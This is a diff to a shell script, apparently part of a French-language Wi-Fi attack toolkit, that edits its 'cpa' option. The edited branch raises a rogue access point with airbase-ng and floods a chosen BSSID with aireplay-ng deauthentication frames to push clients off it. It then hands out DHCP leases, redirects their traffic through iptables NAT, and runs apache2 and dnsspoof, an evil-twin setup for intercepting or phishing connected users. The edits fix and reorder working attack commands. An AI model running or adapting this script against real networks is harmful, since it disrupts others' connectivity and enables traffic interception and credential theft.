@@ -646,7 +646,6 @@ fi
 
 
 
-
 if [ $choix = "cpa" ]
 then
 echo
@@ -669,7 +668,7 @@ echo
 echo  -e '\e[1;31m '
 read -p 'interface : ' interfacecpa
 n_secondes=7
-( xterm -title wait... -e "airodump-ng $interfacecpa >> lewifi1.txt") &
+( xterm -title wait... -e "airodump-ng $interfacecpa >> lewifi1.txt &>/dev/null") &
 sleep 7
 kill $!
 cat lewifi1.txt
@@ -690,11 +689,10 @@ echo
 echo
 echo
 read -p 'bssid : ' bssidcpa
-cd data
-service apache2 start
 xterm -title cpa -e "airbase-ng $interfacecpa -e $apcpa -c 6" &
+sleep 2
 ifconfig at0 up 192.168.3.1 netmask 255.255.255.0
-xterm -e dhcpd -d -f -cf dhcp.conf  | xterm -title deauth -e "airelay-ng $interfacecpa -0 9999 -a $bssidcpa" &
+xterm -e dhcpd -d -f -cf dhcpd12.conf | xterm -e aireplay-ng $interfacecpa -0 9989 -a $bssidcpa &
 sysctl net.ipv4.ip_forward=1
 iptables --flush
   iptables --table nat --flush
@@ -716,9 +714,10 @@ iptables --flush
   iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT \
     --to-destination 192.168.3.1:67
   iptables -t nat -A POSTROUTING -j MASQUERADE
-xterm -title dhcp-server -e dhcpd -d -f -cf dhcpd12.conf &
+  service apache2 start
 xterm -e dnsspoof -i at0
 fi
+
 
 
 
